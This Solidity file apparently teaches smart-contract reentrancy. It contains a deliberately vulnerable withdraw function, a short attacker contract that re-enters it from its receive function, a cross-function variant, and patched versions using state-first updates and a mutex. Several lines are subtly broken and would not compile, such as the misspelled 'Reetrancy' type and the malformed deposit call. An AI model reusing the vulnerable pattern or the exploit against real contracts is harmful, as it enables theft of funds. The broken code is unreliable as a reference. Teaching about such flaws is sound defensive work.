pragma solidity 0.8.17;
contract Reentrancy {
    mapping (address => uint) private userBalances;

    // function deposit...

    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        (bool success, ) = msg.sender.call{value: amountToWithdraw}("");
        require(success);
        userBalances[msg.sender] = 0;
    }
}

contract ExploitReentrancy {
    Reetrancy private immutable _target;
    uint8 private rounds = 0;
    constructor(address target) {
        _target = target;
        _target.deposit({value: 1 ether});
    }

    function withdraw() {
        _target.withdrawBalance();
    }

    receive() payable {
        rounds += 1;
        if (rounds < 10)
            _target.withdrawBalance();
    }
}

contract CrossReentrancy {
    mapping (address => uint) private userBalances;
    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        (bool success, ) = msg.sender.call{value: amountToWithdraw}("");
        require(success);
        userBalances[msg.sender] = 0;
    }

    function transfer(address to, uint amount) public {
        if (userBalances[msg.sender] >= amount) {
        userBalances[to] += amount;
        userBalances[msg.sender] -= amount;
        }
    }
}

contract NoReentrancy {
    mapping (address => uint) private userBalances;
    function withdrawBalancePatch() public {
        uint amountToWithdraw = userBalances[msg.sender];
        userBalances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amountToWithdraw}(""); // The user's balance is already 0, so future invocations won't withdraw anything
        require(success);
    }

    bool private reentrant;
    modifier notReentrant() {
        require(reentrant == false, "Protection activated.");
        reentrant = true;
        _;
        reentrant = false;
    }

    function safeWithdrawBalance() public notReentrant {
        uint amountToWithdraw = userBalances[msg.sender];
        userBalances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amountToWithdraw}(""); // The user's balance is already 0, so future invocations won't withdraw anything
        require(success);
    }

}